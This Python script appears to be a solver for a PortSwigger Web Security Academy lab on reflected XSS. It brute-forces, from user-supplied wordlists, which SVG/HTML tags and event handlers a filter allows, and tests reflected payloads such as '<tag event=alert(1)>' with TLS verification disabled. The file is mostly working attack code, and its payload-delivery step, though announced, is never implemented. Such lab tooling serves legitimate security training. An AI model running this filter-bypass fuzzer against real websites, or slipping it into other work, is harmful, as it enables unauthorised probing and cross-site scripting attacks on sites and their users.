#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Exploit Script: Reflected XSS with customizable SVG tag combination

This script targets a PortSwigger Web Security Academy lab scenario where only certain SVG tags
are whitelisted, and event handlers are selectively permitted. The user can define a combination
of allowed SVG tags and events.

Steps:
  1. Input LAB domain and path via user input.
  2. Optionally configure Burp Proxy.
  3. User can choose to brute-force tags or events multiple times in any order.
  4. If events are chosen first, ask the user to provide at least one tag manually.
  5. After each operation, the user is returned to the action selection menu.
  6. Deliver the payload.
"""

import requests
from colorama import init, Fore, Style
import urllib.parse
import urllib3

# Initialize colorama for colored terminal output
init(autoreset=True)

# Disable SSL warnings for Burp Proxy interception
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_lab_url_and_proxy():
    """
    Prompt the user to enter the lab domain, path, and proxy settings if needed.
    """
    domain = input(f"{Fore.CYAN}Enter the LAB domain (e.g., https://YOUR-LAB-ID.web-security-academy.net): {Style.RESET_ALL}").strip()
    path = input(f"{Fore.CYAN}Enter the path for the target (e.g., /?search=*): {Style.RESET_ALL}").strip()

    use_proxy = input(f"{Fore.MAGENTA}Do you want to use a Burp Proxy? (y/n): {Style.RESET_ALL}").strip().lower()
    if use_proxy == 'y':
        proxy_host = input(f"{Fore.CYAN}Enter proxy host (default: 127.0.0.1): {Style.RESET_ALL}").strip() or "127.0.0.1"
        proxy_port = input(f"{Fore.CYAN}Enter proxy port (default: 8080): {Style.RESET_ALL}").strip() or "8080"
        proxy_url = f"http://{proxy_host}:{proxy_port}"
        burp_proxy = {"http": proxy_url, "https": proxy_url}
        print(f"{Fore.GREEN}[+] Proxy set to: {proxy_url}{Style.RESET_ALL}")
    else:
        burp_proxy = None
        print(f"{Fore.YELLOW}[!] No proxy will be used.{Style.RESET_ALL}")

    return domain, path, burp_proxy

def brute_force_tags(domain, path, burp_proxy):
    """
    Brute-force tags using user-provided wordlist and identify allowed tags.
    """
    allowed_tags = []
    wordlist_file = input(f"{Fore.CYAN}Enter the tag wordlist file path(e.g., tags.txt): {Style.RESET_ALL}").strip()
    try:
        with open(wordlist_file, 'r') as f:
            tags = f.read().splitlines()

        print(f"{Fore.YELLOW}[*] Starting tag brute force...{Style.RESET_ALL}")
        for tag in tags:
            payload = f"<{tag}>"
            encoded_payload = urllib.parse.quote(payload)
            test_url = f"{domain}{path.replace('*', encoded_payload)}"
            response = requests.get(test_url, verify=False, proxies=burp_proxy)
            if response.status_code == 200:
                print(f"{Fore.GREEN}[+] Allowed tag found: <{tag}>{Style.RESET_ALL}")
                if f"<{tag}>" in response.text:
                    print(f"{Fore.RED}[!] Potential XSS detected: <{tag}>")
                allowed_tags.append(tag)

    except FileNotFoundError:
        print(f"{Fore.RED}[!] Wordlist file not found!{Style.RESET_ALL}")
    except requests.RequestException as e:
        print(f"{Fore.RED}[!] Request error: {e}{Style.RESET_ALL}")

    return allowed_tags

def brute_force_events(domain, path, burp_proxy, allowed_tags):
    """
    Brute-force events using user-provided event wordlist and identify allowed events.
    """
    manual_tag = None  # Initialize manual_tag to avoid UnboundLocalError

    if not allowed_tags:
        manual_tag = input(f"{Fore.CYAN}Enter a tag name to use for event brute-forcing (e.g., svg): {Style.RESET_ALL}").strip()
        allowed_tags.append(manual_tag)
        if not manual_tag:
            print(f"{Fore.RED}[!] No tag provided. Cannot brute-force events without a tag.{Style.RESET_ALL}")
            return []

    allowed_events = []
    event_wordlist = input(f"{Fore.CYAN}Enter the event wordlist file path(e.g., events.txt): {Style.RESET_ALL}").strip()
    try:
        with open(event_wordlist, 'r') as f:
            events = f.read().splitlines()
        tag_structure = ""
        event_tag = manual_tag or input(f"{Fore.CYAN}Enter event_tag name (e.g., animatetransform) or press Enter to skip: {Style.RESET_ALL}").strip()
        while True:
            print(f"{Fore.YELLOW}[!] Current TAG structure: {tag_structure}<{event_tag} §event§=alert(1)>{Style.RESET_ALL}")
            tag = input(f"{Fore.CYAN}Enter tag name (e.g., svg) or press Enter to start brute force. Allowed tags[{', '.join(allowed_tags)}]: {Style.RESET_ALL}").strip()
            if not tag:
                print(f"{Fore.YELLOW}[*] Starting tag brute force...{Style.RESET_ALL}")
                break
            if tag not in allowed_tags:
                print(f"{Fore.RED}[!] Invalid tag. Please choose from the allowed tags.{Style.RESET_ALL}")
            else:
                tag_structure = f"<{tag}>{tag_structure}"

        print(f"{Fore.YELLOW}[*] payload:{tag_structure}<{event_tag} §event§=alert(1)>. Starting event brute force...{Style.RESET_ALL}")
        for event in events:
            payload = f"{tag_structure}<{event_tag} {event}=alert(1)>"
            encoded_payload = urllib.parse.quote(payload)
            test_url = f"{domain}{path.replace('*', encoded_payload)}"
            response = requests.get(test_url, verify=False, proxies=burp_proxy)
            if response.status_code == 200:
                print(f"{Fore.GREEN}[+] Allowed event found: {event}{Style.RESET_ALL}")
                if payload in response.text:
                    print(f"{Fore.RED}[!] Potential XSS detected: {payload}{Style.RESET_ALL}")
                allowed_events.append(event)

    except FileNotFoundError:
        print(f"{Fore.RED}[!] Event wordlist file not found!{Style.RESET_ALL}")
    except requests.RequestException as e:
        print(f"{Fore.RED}[!] Request error: {e}{Style.RESET_ALL}")

    return allowed_events

def main():
    print(f"{Fore.CYAN}=== Reflected XSS Exploit Script ==={Style.RESET_ALL}")

    domain, path, burp_proxy = get_lab_url_and_proxy()

    allowed_tags = []
    allowed_events = []

    while True:
        action = input(f"{Fore.MAGENTA}Choose an action (tags/events/quit): {Style.RESET_ALL}").strip().lower()

        if action == 'tags':
            allowed_tags = brute_force_tags(domain, path, burp_proxy)
        elif action == 'events':
            allowed_events = brute_force_events(domain, path, burp_proxy, allowed_tags)
        elif action == 'quit':
            break
        else:
            print(f"{Fore.RED}[!] Invalid choice. Please enter 'tags', 'events', or 'quit'.{Style.RESET_ALL}")

    if not allowed_tags:
        print(f"{Fore.RED}[!] No allowed tags found. Exiting...{Style.RESET_ALL}")
        return

    if not allowed_events:
        print(f"{Fore.RED}[!] No allowed events found. Exiting...{Style.RESET_ALL}")
        return

if __name__ == "__main__":
    main()
